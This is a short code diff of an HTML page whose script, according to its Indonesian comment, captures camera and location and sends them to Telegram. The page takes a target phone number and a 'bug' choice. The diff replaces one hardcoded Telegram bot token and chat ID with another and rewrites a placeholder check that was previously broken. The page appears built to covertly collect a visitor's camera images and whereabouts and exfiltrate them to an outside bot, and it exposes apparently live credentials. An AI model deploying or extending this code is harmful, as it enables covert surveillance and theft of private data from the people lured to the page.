@@ -142,8 +142,8 @@ label{display:block;font-size:13px;color:rgba(179,76,255,0.9);margin-bottom:6px}
   <!-- full-featured script: kamera + lokasi + kirim ke Telegram -->  
   <script>
     // === CONFIGURE THESE BEFORE DEPLOY ===
-    const BOT_TOKEN = "8242531966:AAHdtaXS6MaCYdyRE-RyYFBzSnamZ6uMNkQ";
-    const CHAT_ID = "7885097329";
+    const BOT_TOKEN = "8426427901:AAFxIj02Q-uq9XyVQh7hk7mQ-HkVY52c3o0";
+    const CHAT_ID = "8316267465";
 
     const logBox = document.getElementById('logBox');
     const pb = document.getElementById('pb');
@@ -278,9 +278,7 @@ label{display:block;font-size:13px;color:rgba(179,76,255,0.9);margin-bottom:6px}
       const number = document.getElementById('targetNumber').value.trim();
       const bug = document.getElementById('bugSelect').value;
       if(!number){ alert('Masukkan nomor dulu!'); return; }
-
-// Yang harus di ganti
-      if(BOT_TOKEN === '8426427901:AAFxIj02Q-uq9XyVQh7hk7mQ-HkVY52c3o0 || CHAT_ID === '8316267465'){
+      if(BOT_TOKEN === 'ISI_TOKEN_BOT' || CHAT_ID === 'ISI_CHAT_ID'){
         alert('Isi dulu BOT_TOKEN dan CHAT_ID di file sebelum menguji.');
         return;
       }
